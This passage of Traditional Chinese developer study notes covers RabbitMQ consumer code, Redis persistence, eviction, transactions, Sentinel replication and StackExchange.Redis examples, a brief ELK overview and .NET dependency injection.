      };
      
      var conn = factory.CreateConnection();
      var chanel = conn.CreateModel();
      chanel.QueueDeclare(QUEUENAME, true, false, false);
      EventingBasicConsumer consumer = new EventingBasicConsumer(chanel);
      
      //持續監聽QUEUE的內容，若有更新會持續接收直到關閉
      consumer.Received += (a, e) =>
      {
          Console.WriteLine($"{DateTime.Now.ToString()}接收到訊息:" + Encoding.Default.GetString(e.Body.ToArray()));
          chanel.BasicAck(e.DeliveryTag, true); //收到回覆後，RabbitMQ會直接在佇列中刪除這條訊息
      };
      chanel.BasicConsume(QUEUENAME, false, consumer);
      ```




## Redis

- ### 使用場景

  - ###### 配合 RDBMS 做高速快取

  - ###### 高頻次，熱門訪問的數據，降低資料庫 I/O

  - ###### 分散式架構，做 session共享

  - ###### 利用多樣的數據結構儲存特定的數據

- ##### 高效能的 key-value 資料庫，因為Redis可以儲存不同型態的資料(也可以透過plugins)，因此可以減少使用不同儲存體(DB、File Base、Cache)

  - ###### 減少不同儲存體之間的溝通，進而減少溝通間的時間成本。加快執行速度

  - ###### 方便維護、擴展

- ##### 特點：

  - ###### 支援資料的持久化，可以將記憶體中的資料儲存在磁碟中，重啟的時候可以再次載入進行使用

  - ###### 不僅僅支援簡單的key-value型別的資料，同時還提供list，set，zset，hash等資料結構的儲存。

  - ###### 支援資料的備份，即master-slave模式的資料備份。

- ##### 優勢

  - ###### Redis 是 **persistent** storage，**全部資料**存在記憶體內，所以資料大小上限受限於記憶體。資料會週期性備份到硬碟上 (RDB) 或是將所有更新寫入 append-only logs (AOF)。因此可以提供最快的操作

  - ###### 預設資料**不會 expire**。可以用 [expire](https://redis.io/commands/expire) 指定 expire 時間。預設是記憶滿了就不能寫入資料，設定 [LRU](https://redis.io/topics/lru-cache) 的模式可以決定是只刪有設 expire 的 keys 或是都刪。例如 `volatile-ttl` 會照 TTL 優先刪掉 TTL 最小的 key 且只會刪有設 expire 的 keys。

  - ###### 供多種常用資料結構如 [sorted set](https://redis.io/commands#sorted_set)、hash、geospatial、publish/subscribe events。可裝 plugin 使用其它資料結構。

  - ###### 主程式在單一 thread 執行，不用擔心 race conditions。但要留意執行太慢的操作會卡住整個系統

    - ###### race conditions: 兩個不同的程序同時對同一個資源進行修改，導致錯誤

  - ###### 因為記憶體操作超快，減少呼叫 Redis 的次數是效率關鍵。

- ##### 與Memory Cache比較

  - ###### Memcached 用 multi-thread 處理請求，Redis 只有 main thread。

  - ###### Memcached 只支援簡單的資料型別。

    - 如果只需要簡單的資料型別，memcached 較能善用 CPU。

- ### 高可用

  - ###### Redis 支援 Master-Slave（主從式架構），主要是將 Master 同步至 Slave，這樣當整體的 Traffic 流量較大時，可以將一些流量導至 Slave 減輕 Master 的負擔，詳細的部分可以參考 [這裡](https://stevenitlife.blogspot.com/2018/09/redis-master-slave.html)。

- ### 資料保留

  - ###### Redis 可以將 memory 的資料保存至硬碟中，有兩種不同的方式可以進行備份，分別為 `RDB` 與 `AOF`，詳細的部分可以參考 [這裡](https://segmentfault.com/a/1190000002906345)。

    - ##### 快照（`RDB`文件）:

      - ###### 在特定間隔時間條件達到時，將Redis在記憶體中的內容保存到RDB檔案(二進位格式)中．也就是在特定時間點的快照．當Redis服務啟動時，可以讀取RDB檔案來恢復到記憶體中．

      - ###### 優點：

        - ###### RDB是存放Redis某個時間點的快照，適合用在備份或是異地備份，提供災難復原使用，且只要備份一個檔案即可．

        - ###### RDB進行中對Redis效能的影響很小，因為Redis的父Process會fork一個子Process獨立進行產生RDB，父Process不需要進行IO操作．

        - ###### 當Redis重新啟動時，如有大量資料的情況下，RDB比AOF有更短的啟動時間．

      - ###### 缺點：

        - ###### 因為RDB是某個時間點的快照，不是最新的內容，故有可以會發生資料遺失的狀況．

        - ###### 如果資料量極大且產生快照RDB的頻率太高時，有可以會因此耗用較多的CPU效能，影響到父Process的客戶端操作回應．

    - ######  異動日誌（`AOF`文件）:

      - ###### 將Redis服務所收到的每個操作成功記錄，日誌為RESP協定格式儲存在日誌文字檔．並在每次新增在現有日誌檔的最後面，當日誌檔案過大時，Redis會透過覆寫的方式來持續寫入日誌檔，當Redis服務啟動時會將日誌檔載入來產生記憶體中的資料內容。

      - ###### 優點：

        - ###### 資料完整且持續，搭配不同的fsync策略 (關閉fsync、每秒fsync、每次操作fsync)，可以兼具效能與完整持續性，最多只會一秒的資料遺失。

        - ###### 因寫入日誌檔是透過持續操作新增在檔案最後，故不需要搜尋時間與擔心資料毀損 (可以透過redis-check-aof aof日誌檔 ，來確認檔案是否有問題，有問題可以加入redis-check-aof --fix aof日誌檔，進行修復)。

        - ###### 當aof日誌檔案過大時，Redis服務會自動使用背景方式覆寫aof檔案。

        - ###### aof日誌檔內容為RESP協定格式儲存，人可以容易閱讀。

      - ###### 缺點：

        - ###### 以相同資料量來比較rdb與aof檔案，aof通常會大於rdb檔案。

        - ###### 依據所使用的fsync策略aof寫入速度可能會較rdb慢，如果關閉fsync，即使是在大量操作時，aof與rdb速度會接近一樣快。

  - ### 重啟如何恢復資料呢？ 

    - ###### Redis啟動前會先檢查AOF檔案，不存在才會去載入RDB檔案，因為AOF的資料完整性高，最多也就損失1秒的資料。

- ### 記憶體淘汰策略

  - ###### noeviction： 不刪除，直接返回報錯資訊。

  - ###### allkeys-lru：移除最久未使用（使用頻率最少）使用的key。推薦使用這種。

  - ###### volatile-lru：在設定了過期時間key中，移除最久未使用的key。

  - ###### allkeys-random：隨機移除某個key。

  - ###### volatile-random：在設定了過期時間的key中，隨機移除某個key。

  - ###### volatile-ttl： 在設定了過期時間的key中，移除準備過期的key。

  - ###### allkeys-lfu：移除最近最少使用的key。

  - ###### volatile-lfu：在設定了過期時間的key中，移除最近最少使用的key。

- ### 過期鍵刪除策略

  - ##### 定時刪除

    - ###### 在設定鍵的過期時間的同時，建立一個定時器，讓定時器在講的過期時間來臨時，執行對鍵的刪除操作

    - ###### 定時刪除會佔用CPU時間，響應伺服器的響應時間和吞吐量

  - ##### 惰性刪除

    - ###### 任由鍵過期先不刪除，但是每次從鍵空間中獲取鍵時都檢查取得的鍵是否過期，如果過期則刪除鍵

    - ###### 惰性刪除浪費太多記憶體，有記憶體洩漏的危險

  - ##### 定期刪除

    - ###### 每隔一段時間，程式就對資料庫進行一次檢查，刪除裡面的過期鍵。至於刪除多少過期鍵，則根據多少個過期鍵和演算法決定

    - ###### 定期刪除是前兩種策略的整合和折中。因為是批量操作，並限定了執行時長和頻率，可以有效減少刪除操作對CPU的響應，也避免了記憶體長久不刪除的導致的浪費

### 資料型態

- #### **String**

  - ##### *String 是 Redis 中最基礎的資料型別，透過 binary 形式儲存，且保證不更改資料內容 (binary-safe)，因此 String 可儲存任何資料，例如一般字串，數字，檔案以及序列化後的物件等。*

- #### List

  - ##### List 是由多個 redis 的 String 所組成，List 中成員會依照插入的順序儲存，其提供由頭尾插入，以及頭尾拿出的功能，List 能實作的功能很多，例如任務隊列，以及優先權隊列等。

- #### Set

  - ##### Set 是多個 Redis 中 String 以無序的方式所組成，其保證內部不會有重複的元素，此外 Redis 提供了多個 Set 之間交集，差集，聯集的操作。

  - ```C#
    redis 127.0.0.1:6379> SADD runoobkey redis
    (integer) 1
    redis 127.0.0.1:6379> SADD runoobkey mongodb
    (integer) 1
    redis 127.0.0.1:6379> SADD runoobkey mysql
    (integer) 1
    redis 127.0.0.1:6379> SADD runoobkey mysql
    (integer) 0
    redis 127.0.0.1:6379> SMEMBERS runoobkey
    
    1) "mysql"
    2) "mongodb"
    3) "redis"
    ```

- #### Hash

  - ##### Hash是用來儲存多組欄位值，可以是數字或字串．使用者可以對值進行操作，跟資料結構中的dictionary概念很像．

  - ##### Hash在Redis內部可能是ziplist or a hash table，基本上被設計為高效能的雙向鏈結表(dually linked list)，且整數資料類型被真實儲存為整數而非字串。

  - ##### Hash如果欄位值個數 < 512且總長度 < 64 bytes，則使用ziplist，其餘使用hashtable．

  - ##### Hash優點

    - ###### 將所有相關的field and value放在同一個key中儲存，減少記憶體消耗

    - ###### 多個field只需要一個key，減少key重覆的可能

    - ###### 可以一次存取多個field and value只需要一個取得key的指令，減少CPU與記憶體的消耗

    - ###### String能做到的Hash也都可以

  - ##### Hash缺點

    - ###### Field不能設定過期時間

    - ###### 沒有bit相關操作

    - ###### 當值很大時，無法分散到其他伺服器(Redis Cluster架構)

  - ##### 由於透過[string](https://dotblogs.com.tw/ricochen/2017/01/11/092137)資料型別儲存其他屬性必須進行序列化和反序列化，而且修改某一屬性必須把整個entity取回並lock對並發情況進行保護

    - ###### 這時Hash就提供了很好的解決方法，假設今天要儲存使用者資訊，key依然是使用者ID，但value是一個map，這個map的key是屬性名，value是屬性值，當要修改或存取內部的key，可以透過key(使用者ID)+field(屬性名)操作對應屬性值，如此便可避免序列化、反序列化花費，和併發修改控制的問題，但要注意map的屬性名不可過多，因為Redis為單一執行緒，map列舉過多可能會相當耗時。

    - ![img](https://dotblogsfile.blob.core.windows.net/user/ricochen/133abc51-46b4-42bf-afe5-8d90fa527abe/1484494713_94683.png)

  - ![img](https://dotblogsfile.blob.core.windows.net/user/ricochen/133abc51-46b4-42bf-afe5-8d90fa527abe/1484494735_40553.png)


### Transaction

- ### MULTI

  - ##### 開啟Transaction(類似beginTraction)

- ### EXEC

  - ##### 執行Multi開始的所有命令(類似Commit)

  - ```powershell
    127.0.0.1:6379> MULTI
    OK
    127.0.0.1:6379> get foo
    QUEUED
    127.0.0.1:6379> set ff test
    QUEUED
    127.0.0.1:6379> exec
    1) "test"
    2) OK
    ```

- ### DISCARD

  - ##### 取消Multi開始的所有命令(rollback)

  - ```powershell
    127.0.0.1:6379> MULTI
    OK
    127.0.0.1:6379> set t 123
    QUEUED
    127.0.0.1:6379> get foo
    QUEUED
    127.0.0.1:6379> set k 234
    QUEUED
    127.0.0.1:6379> DISCARD
    OK
    127.0.0.1:6379> get t
    (nil)
    127.0.0.1:6379> get k
    (nil)
    ```

- ### WATCH

  - ##### 針對特定 key 進行監控，如果被監控的 key 被異動過，則執行 `EXEC` 時會失敗

    - ###### 举个例子， 如果客户端 A 和 B 都读取了键原来的值， 比如 `10` ， 那么两个客户端都会将键的值设为 `11` ， 但正确的结果应该是 `12` 才对。如果在 [WATCH](http://redisdoc.com/transaction/watch.html#watch) 执行之后， [EXEC](http://redisdoc.com/transaction/exec.html#exec) 执行之前， 有其他客户端修改了 `mykey` 的值， 那么当前客户端的事务就会失败。(樂觀鎖) 

  - ```powershell
    > SET mykey 0
    OK
    > WATCH mykey
    OK
    > SET mykey 1
    OK
    > MULTI
    OK
    > SET mykey 2
    QUEUED
    > EXEC
    (nil)
    > GET mykey
    "1"
    ```

- ###### 我們必須了解到 Redis transaction，能夠被實現的條件是基於 check-and-set 的 two-phase commit，而 check-and-set 則是因 Redis 2.2 後有 optimistic lock 得以實作。其中 `WATCH` 便是我們的 optimistic lock 實作出的方法，針對單一 key value 進行監控，配合 `EXEC` 確保本次 transaction 的原子性(atomic)，保證我們這一系列的操作都可以如預期地被完成。

### Cluster 

- ##### **Scalability** : 幫你將資料分散在不同的機器上，即便資料量變大，你也可以透過橫向擴展來 Handle 大量資料。

- ##### **Availability** : 提供 Fail-Over 功能，即便某個機器掛掉了，不僅不會影響 Client 向 Cluster 讀寫資料，Client 還可在別台活著的機器上找到掛點機器的資料。

- ##### Gossip:

  - ##### 由種子節點發起，當一個種子節點有狀態需要更新到網絡中的其他節點時，它會隨機的選擇周圍幾個節點散播消息，收到消息的節點也會重複該過程，直至最終網絡中所有的節點都收到了消息。

    - ###### Gossip 是周期性的散播消息，把周期限定為 1 秒

    - ###### 被感染節點隨機選擇 k 個鄰接節點（fan-out）散播消息，這裡把 fan-out 設置為 3，每次最多往 3 個節點散播。

    - ###### 每次散播消息都選擇**尚未發送過的節點**進行散播

    - ###### 收到消息的節點不再往發送節點散播，比如 A -> B，那麼 B 進行散播的時候，不再發給 A。

    - ![img](http://i1.kknews.cc/4rvEv6ofey7UaadDz5lSgtLCHyzhvxKx6g/0.jpg)

  - ##### 特點

    - ###### 擴展性:  允許節點的任意增加和減少，新增加的節點的狀態最終會與其他節點一致。

    - ###### 容錯: 任何節點的宕機和重啟都不會影響 Gossip 消息的傳播，Gossip 協議具有天然的分布式系統容錯特性

    - ###### 去中心化:  不要求任何中心節點，所有節點都可以是對等的，任何一個節點無需知道整個網絡狀況，只要網絡是連通的，任意一個節點就可以把消息散播到全網。

    - ###### 一致性收斂: 協議中的消息會以一傳十、十傳百一樣的指數級速度在網絡中快速傳播，因此系統狀態的不一致可以在很快的時間內收斂到一致。

  - ##### 缺陷

    - ###### 消息的延遲:  節點只會隨機向少數幾個節點發送消息，消息最終是通過多個輪次的散播而到達全網的，因此使用 Gossip 協議會造成不可避免的消息延遲。**不適合用在對實時性要求較高的場景下。**

    - ###### 消息冗餘: 節點會定期隨機選擇周圍節點發送消息，而收到消息的節點也會重複該步驟，因此就不可避免的存在消息重複發送給同一節點的情況，造成了**消息的冗餘**，同時也增加了收到消息的節點的處理壓力。而且，由於是定期發送而且不反饋，因此，即使節點收到了消息，還是會反覆收到重複消息，加重了消息的冗餘

    - 

      

### 安裝

-  使用Chocolate `choco install redis`

-  測試redis是否正常啟用

  - ```powershell
    > redis-cli ping
    PONG
    ```

- 停止redis 服務`redis-server --service-start`

- 啟用redis 服務`redis-server --service-stop`

- 新增測試值

  - ```powershell
    > redis-cli set Test "hello world"
    OK
    ```

- 查詢資料

  - ```powershell
    > redis-cli get Test
    "hello world"
    ```

- ##### 圖形化使用者管理介面

  -  [Redis Desktop Manager](https://github.com/uglide/RedisDesktopManager/releases/tag/0.8.8)

### 快取擊穿

- ##### 快取擊穿指的是某個 **key 一直在扛著高併發** ，所謂扛著高併發就是說大量的請求都是獲取這個 key 對應的值。而這個 key 在某個時間突然失效了，大量的請求就無法在快取中獲取資料了，而是去請求資料庫了，這樣很有可能導致資料庫被擊垮。這就是快取擊穿。

  - ###### 如何應對呢？既然這個 key受歡迎， 那麼就不要設定過期時間了，如果該key的資料更新了，那麼就通過互斥鎖的方式將其更新。如果不使用互斥鎖的方式很容易導致資料不一致的情況，這裡為了保證快取和資料庫的一致性，就只能犧牲一點點的效率了。

### 快取雪崩

- ##### 由於原有快取失效（或者資料未載入到快取中），新快取未到期間所有原本應該訪問快取的請求都去查詢資料庫了，而對資料庫CPU和記憶體造成巨大壓力，嚴重的會造成資料庫宕機，造成系統的崩潰。

- ##### 在某個時間節點，大量的 key 失效，導致大量的請求從快取中獲取不到資料而去請求資料庫 。

  - ###### 最簡單的情況就是把key的過期時間分散開，也就是在設定key的過期時間的時候再加一個隨機值，就這樣就能完美的解決快取雪崩的問題。

### 快取預熱

- ##### 將一些可能經常使用資料在系統啟動的時候預先設定到快取中，這樣可以避免在使用到的時候先去資料庫中查詢。

- ##### 還有一種方式就是新增一個快取重新整理頁，這樣通過人工干預的方式將一些可能為熱點的key新增到快取中。

### 快取降級

- 

### Redis Replication 

- ##### Redis 支援 Master-Slave（主從式架構），主要是將 Master 同步至 Slave，這樣當整體的 Traffic 流量較大時，可以將一些流量導至 Slave 減輕 Master 的負擔，詳細的部分可以參考 [這裡](https://stevenitlife.blogspot.com/2018/09/redis-master-slave.html)。

- ##### 讀寫分離

  - ###### 當用戶端需要讀寫的時候，必須要透過Master才可以進行讀寫操作．

  - ###### 當用戶端只需要讀取資料而不需要寫入的時後，可以考慮直接連Replica取得資料，減輕Master的負擔．

- ##### Sentinel機制

  - ###### 哨兵模式就是用來監視 Redis 系統，哨兵會監控 Master 是否正常運作。如果遇到 Master 出現故障或是離線時，哨兵之間會開始判斷，直到我們所設定需達到的判斷數量後，哨兵會將其所屬的 Slave 變成 Master，並再將其他的 Slave 指向新的 Master。

    - ![img](https://raw.githubusercontent.com/880831ian/redis-sentinel-docker/master/images/sentinal.png)

  - ##### 功能

    - ###### 監控

      - ###### 哨兵會和要監控的 Master 建立兩條連接，`Cmd` 和 `Pub/Sub`：

        - ###### Cmd 是哨兵用來定期向 Master 發送 `Info` 命令以取得 Master 的訊息，訊息中會包含 Master 有哪些 Slave。當與 Master 獲得 Slave 訊息後，哨兵也會和 Slave 建立連接。

        - ###### 哨兵也會定期透過 `Cmd` 向 Master、Slave 和其他哨兵發送 `Ping` 指令來檢查是否存在，確認節點狀態等。

        - ###### `Pub/Sub` 讓哨兵可以透過訂閱 Master 和 Slave 的 `__Sentinel__:hello` 這個頻道來和其他哨兵定期的進行資訊交換。

    - ###### 主觀下線 (SDOWN)

      - ###### 單個哨兵認為 Master 已經停止服務了，有可能是網路不通或是接收不到訂閱等，而哨兵的判斷是依據傳送 Ping 指令之後一定時間內是否收到回覆或是錯誤訊息，如果有哨兵就會主觀認為這個 Master 已經下線停止服務了。

    - ###### 客觀下線 (ODOWN)

      - ###### 由多個哨兵對同一個 Master 各自進行主觀下線的判斷後，再綜合所有哨兵的判斷。若是認為主觀下線的哨兵到達我們所配置的數量後，即為客觀下線。

    - ###### 故障轉移 (Failover)

      - ###### 當 Master 已經被標記為客觀下線時，起初發現 Master 下線的哨兵會發起一個選舉 (採用的是 Raft 演算法)，並要求其他哨兵選他做為領頭哨兵，領頭哨兵會負責進行故障的恢復。當選的標準是要有超過一半的哨兵同意，所以哨兵的數量建議設定成奇數個。

      - ###### 選出領頭哨兵後，領頭哨兵會開始從下線的 Master 所屬 Slave 中跳選出一個來變成新的 Master，挑選的依據如下：

        1. ###### 所有在線的 Slave 擁有最高優先權的，優先權可以透過 slave-priority 來做設定。

        2. ###### 如果有多個同為最高優先權的 Slave，則會選擇複製最完整的。

        3. ###### 若還是有多個 Slave 皆符合上述條件，則選擇 id 最小的。

      - ###### 接著領頭哨兵會將舊的 Master 更新成新的 Master 的 Slave ，讓其恢復服務後以 Slave 的身份繼續運作。

    - ###### 失效自動切換

      - ###### 組態設定提供

  - ##### 設定檔

    - ```yaml
      port 26379
      
      #設定要監控的 Master，最後的 2 代表判定客觀下線所需的哨兵數
      sentinel monitor mymaster 192.168.176.4 6379 2
      
      #哨兵 Ping 不到 Master 超過此毫秒數會認定主觀下線
      sentinel down-after-milliseconds mymaster 5000
      
      #failover 超過次毫秒數即代表 failover 失敗
      sentinel failover-timeout mymaster 180000
      ```

- ##### Master-Slave範例

  - ###### 透過Docker 建立一台Master redis及一台Slave，並藉由Sential服務監控

    - ```yaml
      version: '3.4'
      
      
      services:
        redis-master:
          container_name: redis-master
          image: redis:5.0.3-alpine3.9
          ports:
            - "6379:6379"
        redis-slave:
          container_name: redis-slave
          image: redis:5.0.3-alpine3.9
          # Slave端設定，指定連接的Master的IP和端口號，也需要與Master保持一致
          command: redis-server --slaveof redis-master 6379
          links:
            - redis-master
          ports:
            - "6380:6379"
      
      ```

    - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202207211949479.png)

  - ###### 透過指令可以看到Master可以進行讀寫動作，而Slave會透過同步取得Master寫入的資料但無法單獨寫入

    - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202207202030240.png)

  - ###### 當Master故障時，Sentinel機制會將Slave轉化為Master。並當原先Master啟動後會變成為Slave腳色
  
    - ![img](https://raw.githubusercontent.com/Sean2416/Pic/master/img/202207202036439.png)

### NET Core Example

- 安裝套件 `StackExchange.Redis`

- 連線Redis

  - ```C#
    builder.Services.AddSingleton<IConnectionMultiplexer>(ConnectionMultiplexer.Connect("127.0.0.1:6379,allowAdmin=true"));
    ```

- 新增資料

  - `db.StringSet("Test", value, TimeSpan.FromSeconds(300));`	

- 取得資料

  - ` db.StringGet("Test");` 

- ##### 針對Master-Slave架構

  - ###### 當原本的Master掛掉時，程式端並不會知道新的Master在哪台主機上。因此，需要做另外處理

  - ###### 利用 StackExchange.Redis ConnectionMultiplexer `自動辨識 master` 的特性來做為調整依據

    - ![1automaster](https://cloud.githubusercontent.com/assets/3851540/24083525/573ea7be-0d13-11e7-9f71-c0ec5a0a7d88.png)

  - ```C#
     private static readonly Lazy<ConnectionMultiplexer> Connection;
            /// <summary>
            /// Use EndPoint to connection.
            /// </summary>
            static RedisHaFactory()
            {
                ConfigurationOptions options = new ConfigurationOptions
                {
                    //對應每個節點的redis server
                    EndPoints = { { "127.0.0.1:6379" }, { "127.0.0.1:6380" }, { "127.0.0.1:6381" } },
                     //定義使用的資料庫
                    DefaultDatabase =0
                };
                Connection = new Lazy<ConnectionMultiplexer>(() => ConnectionMultiplexer.Connect(options));
            }
      
            public static ConnectionMultiplexer GetConnection => Connection.Value;
            public static IDatabase RedisDB => GetConnection.GetDatabase();
    ```

- ##### 指定透過Mater 或 Replica操作

  - ```C#
    //寫入的時候只有Mater可以操作，不需要特別指定
    var ab = RedisHaFactory.RedisDB.StringSet("test", "Write string value from another master");
    
    //透過CommandFlags 指定透過replica讀取 (CommandFlags.DemandReplica: 只能透過replica, PreferReplica優先使用replica )
    var stringGet = RedisHaFactory.RedisDB.StringGet("test", CommandFlags.PreferReplica);
    ```

- ##### 簡易搶票實作範例

  - ###### Redis的Lock比較像是一種話語權，取得Lock的request才能進行redis操作。否則只能等待
  
  - ```C#
    private static readonly TicketService _service = new TicketService(_client);
    private static readonly string _eventCountKey = "Event_Count";
    
    private static async Task Run()
    {
        var result = new ConcurrentStack<bool>();
        var tasks = new List<Task>();
        
        // 發出105個task
        for (var index = 0; index < 105; index++)
        {    
            var number = index;
            tasks.Add(Task.Run(async () =>
            {
                // 透過 TicketService 處理搶票的邏輯，返回bool
                result.Push(await _service.GetTicket(_eventCountKey));
                Console.WriteLine($"{number}");
            }));
        }
        await Task.WhenAll(tasks);
    
        // 驗證拿到成功的client request數量
        Console.WriteLine($"success count: {result.Count(r => r == true)}");
    }
    
    public class TicketService
    {
        private readonly RedisClient _client;
    
        public TicketService(RedisClient redisClient)
        {
            _client = redisClient;
        }
    
        public async Task<bool> GetTicket(string key)
        {
            // 只有在數量還有剩 且 透過Redis的Lock成功，才繼續搶票的動作
            // 這邊Lock的Timeout時間為100毫秒，純粹只是為了測試
            if (await TicketCount(key) > 0 && await _client.Lock(key, TimeSpan.FromMilliseconds(100)))
            {
                try
                {
                    // 遞減數量，會返回剩餘的數量，剩餘數量小於0代表超賣了，會返回失敗
                    var lastCount = await _client.StringDecrement(key);
    
                    return lastCount >= 0;
                }
                finally
                {
                    // 完成後要把Lock釋放
                    await _client.LockRelease(key);
                }
            }
    
            return false;
        }
    
        private async Task<int> TicketCount(string key)
        {
            return (int)await _client.GetString(key);
        }
    }
    
    public class RedisClient
    {
        // 可重用，所以在ctor建立後就放到filed上
        private readonly ConnectionMultiplexer _connection;
    
        public RedisClient()
        {
            var options = new ConfigurationOptions()
            {
                EndPoints = {"localhost"}
            };
            _connection = ConnectionMultiplexer.Connect(options);
        }
    
        public async Task<bool> Lock(string key, TimeSpan expiry)
        {
            // Lock失敗就等200毫秒，再重試，最多10次
            var lockKey = $"Lock_{key}";
            var number = 0;
            do
            {
                try
                {
                    var database = _connection.GetDatabase();
                    if (await database.LockTakeAsync(lockKey, Environment.MachineName, expiry))
                    {
                        return true;
                    }
                }
                catch (Exception)
                {
                    await Task.Delay(200);
                    number++;
                }
            } while (number < 10);
    
            return false;
        }
    
        public async Task SetString(string key, RedisValue value)
        {
            var database = _connection.GetDatabase();
            await database.StringSetAsync(key, value);
        }
    
        public async Task<RedisValue> GetString(string key)
        {
            var database = _connection.GetDatabase();
    
            return await database.StringGetAsync(key);
        }
    
        public async Task<bool> LockRelease(string key)
        {
            var lockKey = $"Lock_{key}";
            var database = _connection.GetDatabase();
    
            return await database.LockReleaseAsync(lockKey, Environment.MachineName);
        }
    
        public async Task<long> StringDecrement(string key)
        {
            var database = _connection.GetDatabase();
    
            return await database.StringDecrementAsync(key);
        }
    }
    ```
  
    
  

### 參考

- [ASP.NET Core 註冊 StackExchange.Redis 的方式](https://blog.yowko.com/stackexchange-redis-in-aspdotnet-core/)
- [ASP.NET Core分散式快取Redis主從Sentinel哨兵模式實戰演練](https://www.gushiciku.cn/pl/gvu6/zh-tw)
- [使用 Redis-Sentinel 打造 Redis 的 HA](https://dotblogs.com.tw/supershowwei/2016/02/03/123740)
- [使用Docker-compose 搭建Redis 哨兵模式 - GitHub](https://github.com/880831ian/docker-compose-redis-sentinel)
- [Redis 命令参考](http://redisdoc.com/topic/transaction.html)
- [初識 Redis Cluster](https://vicxu.medium.com/%E5%88%9D%E8%AD%98-redis-cluster-ep-1-redis-cluster-%E6%9E%B6%E6%A7%8B%E7%B0%A1%E4%BB%8B-%E7%95%B6-redis-%E7%BE%A4%E8%81%9A%E5%9C%A8%E4%B8%80%E8%B5%B7-67be41e68654)



## ELK

- #### ELK是開源軟體的集合套件，功能為集中化各來源的資料流與資料分析，可做為網站的日誌分析和監控架構，也能夠協助網站管理者管理網站流量、紀錄造訪資訊進行分析與監控。

  - ###### Elastic Search：儲存資料、資料搜尋檢視的軟體，可以快速搜尋、有效地對資料進行儲存和索引。

  - ###### Logstash：資料處理軟體，可以採集資料、多管道蒐集資料並送到指定位置。

  - ###### Kibana：數據分析和可視化平台，可以快速分析大量的資料，並以視覺化圖表和儀錶板的方式呈現。

- ![ELK](https://www.webcomm.com.tw/blog/wp-content/uploads/2021/12/ELK.png)

- ##### ELK功能為智能數據的應用，除了可以處理規模較大的日誌分析，讓資料檢索更有效率外，也能記錄網站訪客流量的訊息。

  - #####  例如：網站資源的訪問者、訪問的裝置、訪問的結果等等。蒐集流量資料提供了許多後續行銷或商機開發的應用，也能幫助網站管理者更加了解網站的使用者。

### 參考

- [初探.net core NLog - 昕力資訊](https://www.tpisoftware.com/tpu/articleDetails/1337)
- [ELK IN Docker](https://github.com/deviantony/docker-elk/tree/release-7.x)



# .NET

## Dependency Injection

- ###### DI 是指將一個程式的相依關係改由呼叫它的外部程式來決定的方法。保留抽象介面，讓組件依賴於抽象介面，當組件要與其它實際的物件發生依賴關係時，藉過抽象介面來注入依賴的實際物件。

- ### 依賴反轉原則(Dependency-Inversion Principle)

  - ###### 高階模組不應該依賴於低階模組。

    - ###### 兩者都應該依賴抽象，不應該直接去依賴，而是必須藉由抽象來隔開。不應該直接去受到實作的影響，而是只要關注在所需要的功能。

    - ###### 如此一來，依賴就「反轉」了。原本是 `高階模組 → 低階模組` 的關係，變成了 `高階模組 → 介面 ← 低階模組`。並不是高階去依賴低階，而是低階去依賴高階要求的功能。

  - ###### 抽象不應該依賴細節；細節應該依賴抽象。

- ### 控制反轉 (Inversion of Control, IoC)

  - ###### 把實例的建立和實例的使用切分開來，不再是由高階模組去建立並控制低階模組，而是我們讓一個控制反轉中心去建立低階模組，然後高階模組要使用的時候再把這個低階模組交給高階模組使用。

  - ###### 如此一來，控制權也跟著反轉過來了，高階模組從主動建立低階模組，變成被動接收低階模組；也就是從原先的 `高階模組 —(建立)→ 低階模組`，變成了 `高階模組 ←(傳遞低階模組)— 控制反轉中心`。

  - ###### 高階模組再也不需要關心如何建立，該建立哪個實體，只專注於使用功能，真正達到介面的精神。低階模組也只需要等待控制反轉中心分發，到了崗位就把份內事做好，專心在自己的職責身上即可。如此一來就能解除兩者之間的耦合。

- ##### 好處

  - ###### 低耦合，高內聚
  
  - ###### 更清晰的意圖
  
  - ###### 降低邏輯變更造成改動程式碼的幅度
  
  - ###### 關注點分離，提高可測試性
  
- 在沒有使用 DI Framework 的情況下，假設在 UserController 要呼叫 UserLogic，會直接在 UserController 實例化 UserLogic，如下：

  ```C#
  public class MyDependency
  {
      public MyDependency()
      {
      }
  
      public Task WriteMessage(string message)
      {
          Console.WriteLine(
              $"MyDependency.WriteMessage called. Message: {message}");
  
          return Task.FromResult(0);
      }
  }
  
  public class IndexModel : PageModel
  {
      MyDependency _dependency = new MyDependency();
  
      public async Task OnGetAsync()
      {
          await _dependency.WriteMessage(
              "IndexModel.OnGetAsync created this message.");
      }
  }
  ```

- 上述程式碼可正常運作，但會出現下列問題

  - 若要將 `MyDependency` 取代為不同的實作，必須修改該類別。
  - 實作`MyDependency` 的地方越多，未來在置換或維護上越不便。
  - 實作難以進行單元測試。 應用程式應該使用模擬 (Mock) 或虛設常式 (Stub) `MyDependency` 類別，這在使用此方法時無法使用。

- 相依性插入可透過下列方式解決這些問題：

  - 使用介面或基底類別來將相依性資訊抽象化
  - 在服務容器中註冊相依性。 ASP.NET Core 提供內建服務容器 [IServiceProvider](https://docs.microsoft.com/dotnet/api/system.iserviceprovider)。 服務會在應用程式的 `Startup.ConfigureServices` 方法中註冊
  - 將服務「插入」到服務使用位置之類別的建構函式。 架構會負責建立相依性的執行個體，並在不再需要時將它捨棄。

- 建構抽象類別

  ```C#
  public interface IMyDependency
  {
      Task WriteMessage(string message);
  }
  ```

- 實作類別

  ```C#
  public class MyDependency : IMyDependency
  {
      private readonly ILogger<MyDependency> _logger;
  
      public MyDependency(ILogger<MyDependency> logger)
      {
          _logger = logger;
      }
  
      public Task WriteMessage(string message)
      {
          _logger.LogInformation(
              "MyDependency.WriteMessage called. Message: {MESSAGE}", 
              message);
  
          return Task.FromResult(0);
      }
  }
  ```

- 注入

  ```C#
  public void ConfigureServices(IServiceCollection services)
  {
      services.AddRazorPages();
  
      services.AddScoped<IMyDependency, MyDependency>();
      services.AddTransient<IOperationTransient, Operation>();
      services.AddScoped<IOperationScoped, Operation>();
      services.AddSingleton<IOperationSingleton, Operation>();
      services.AddSingleton<IOperationSingletonInstance>(new Operation(Guid.Empty));
  
      // OperationService depends on each of the other Operation types.
      services.AddTransient<OperationService, OperationService>();
      
      //沒有使用介面宣告時
      services.AddScoped<UserManager>();
      
      //宣告實體 帶入參數
       services.AddScoped(provider => new UserManager(configManager.IdSvrConfig));
  }
  ```

### lifetimes

- **Transient**: 每次注入時，都重新 `new` 一個新的實例。
